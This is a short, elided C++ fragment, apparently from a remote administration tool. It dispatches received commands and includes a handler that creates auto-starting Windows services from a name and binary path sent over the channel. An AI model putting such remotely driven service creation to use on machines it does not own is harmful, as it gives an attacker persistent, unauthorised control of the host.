...
void CSerManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	...
	case COMMAND_DISABLESERVERICE:  //禁用服务
		...
		break;
	case	COMMAND_CREATSERVERICE: //创建服务
		MyCreateServer((LPBYTE)lpBuffer + 1);
		break;
	}
}
...
void CSerManager::MyCreateServer(LPBYTE lpBuffer)
{

	SC_HANDLE sc;
	SC_HANDLE server;
	BOOL result = FALSE;
	char* servername = (char*)lpBuffer;
	char* ShowName = (char*)lpBuffer + strlen(servername) + 1;
	char* path = (char*)lpBuffer + strlen(servername) + strlen(ShowName) + 2;

	sc = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (sc)
	{

		server = CreateServiceA(sc, servername, ShowName, SC_MANAGER_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL);
